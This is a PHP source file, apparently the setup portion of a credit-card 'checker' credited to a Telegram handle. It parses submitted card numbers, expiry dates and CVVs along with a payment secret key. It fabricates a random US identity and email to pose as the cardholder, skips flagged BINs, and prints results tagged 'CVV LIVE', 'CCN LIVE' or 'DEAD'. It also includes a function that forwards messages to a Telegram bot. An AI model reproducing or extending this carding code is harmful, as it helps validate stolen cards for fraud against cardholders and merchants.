<?php
//Script Author: phccoder https://t.me/PHCC0D3r

/*===[PHP Setup]==============================================*/
error_reporting(0);
ini_set('display_errors', 0);

/*===[Security Setup]=========================================*/
include 'init.php';
if ($forceAuth && !isset($_SESSION["Auth"])) {
    EchoMessage('DEAD', 'Session Timeout: Please reload the website');
    exit();
}

/*===[Variable Setup]=========================================*/
// OLD CODE:
// $cc_info = $_GET['cc_info'];
// $sk = $_GET['sk'];

// NEW SECURE CODE:
$cc_info = $_POST['cc_info'];
$sk = $_POST['sk'];
$telebot = $_GET['telebot'];
$tele_msg = $_GET['tele_msg'];
if ($_COOKIE['checker_theme'] == 'dark') {
    $theme_background = '#212121';
    $theme_text = '#FFFFFF';
}else{
    $theme_background = '#FFFFFF';
    $theme_text = '#000000';
}

/*===[CC Info Validation]=====================================*/
if (!$testMode) {
    if($cc_info == "" || $sk == ""){
        exit();
    }
    $j=0;
    // OLD
    // while ($j < (sizeof($bug_bin) - 1)) {
    while ($j < count($bug_bin)) {
        if (substr($cc_info, 0, strlen($bug_bin[$j])) === $bug_bin[$j]) {
            EchoMessage('DEAD',$cc_info.' >> BUG BIN Not Accepted for checking...');
            exit();
            break;
        }
        $j++;
    }
}


/*===[Variable Setup]=========================================*/
$i = explode("|", $cc_info);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");

/*===[Identity Setup]=========================================*/
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
$infos = json_decode($get, 1);
$name_first = $infos['results'][0]['name']['first'];
$name_last = $infos['results'][0]['name']['last'];
$name_full = ''.$name_first.' '.$name_last.'';

$location_street = $infos['results'][0]['location']['street'];
$location_city = $infos['results'][0]['location']['city'];
$location_state = $infos['results'][0]['location']['state'];
$location_postcode = $infos['results'][0]['location']['postcode'];
$state_map = [
    "alabama" => "AL", "alaska" => "AK", "arizona" => "AZ",
    "arkansas" => "AR", "california" => "CA", "colorado" => "CO",
    "connecticut" => "CT", "delaware" => "DE", "florida" => "FL",
    "georgia" => "GA", "hawaii" => "HI", "idaho" => "ID",
    "illinois" => "IL", "indiana" => "IN", "iowa" => "IA",
    "kansas" => "KS", "kentucky" => "KY", "louisiana" => "LA",
    "maine" => "ME", "maryland" => "MD", "massachusetts" => "MA",
    "michigan" => "MI", "minnesota" => "MN", "mississippi" => "MS",
    "missouri" => "MO", "montana" => "MT", "nebraska" => "NE",
    "nevada" => "NV", "new hampshire" => "NH", "new jersey" => "NJ",
    "new mexico" => "NM", "new york" => "NY", "north carolina" => "NC",
    "north dakota" => "ND", "ohio" => "OH", "oklahoma" => "OK",
    "oregon" => "OR", "pennsylvania" => "PA", "rhode island" => "RI",
    "south carolina" => "SC", "south dakota" => "SD", "tennessee" => "TN",
    "texas" => "TX", "utah" => "UT", "vermont" => "VT",
    "virginia" => "VA", "washington" => "WA", "west virginia" => "WV",
    "wisconsin" => "WI", "wyoming" => "WY"
];

$location_state_lower = strtolower($infos['results'][0]['location']['state']);
$location_state = $state_map[$location_state_lower] ?? 'KY'; // Default to KY if not found


/*===[PHP Functions]==========================================*/
function BotForwarder($message,$chat_ID){
    $url = $GLOBALS['token_url']."/sendMessage?chat_id=".$chat_ID."&text=".$message."&parse_mode=HTML";
    file_get_contents($url); 
}
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@gmail.com';
}
function EchoMessage($CardStatus,$CardMessage){
    $MessageStructure = '';
    switch ($CardStatus) {
        case 'CVV LIVE':
            echo $MessageStructure = '
                <div class="live_cvv" style="display:none;">
                    <span class="badge badge-primary">'.$CardStatus.'</span>
                    <span style="color: '.$GLOBALS['theme_text'].'"> '.$CardMessage.'</span>
                </div>';
            break;
        case 'CCN LIVE':
            echo $MessageStructure = '
                <div class="live_ccn" style="display:none;">
                    <span class="badge badge-warning">'.$CardStatus.'</span>
                    <span style="color: '.$GLOBALS['theme_text'].'"> '.$CardMessage.'</span>
                </div>';
            break;
        case 'DEAD':
            echo $MessageStructure = '
                <div class="dead" style="display:none;">
                    <span class="badge badge-danger">'.$CardStatus.'</span>
                    <span style="color: '.$GLOBALS['theme_text'].'"> '.$CardMessage.'</span>
                </div>';
            break;
    } 
}

?>